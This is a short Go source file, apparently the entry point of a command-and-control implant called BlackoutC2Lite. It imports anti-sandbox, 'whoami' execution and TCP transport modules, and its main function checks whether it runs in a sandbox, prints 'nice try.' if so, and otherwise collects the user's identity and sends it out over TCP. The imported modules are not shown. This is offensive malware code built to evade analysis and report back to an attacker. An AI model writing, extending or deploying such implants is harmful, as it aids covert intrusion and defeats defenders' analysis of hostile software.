package main

import (
	"BlackoutC2Lite/Modules/Execution/Whoami"
	"BlackoutC2Lite/Modules/Stealth/AntiSandbox"
	"BlackoutC2Lite/Core/Transports/tcp"
	"fmt"
)

func main() {
	if AntiSandbox.Checksandbox() {
		fmt.Println("nice try.")
	} else {
		Whoami.Whoami()
		tcp.TcpSend()
	
	}
}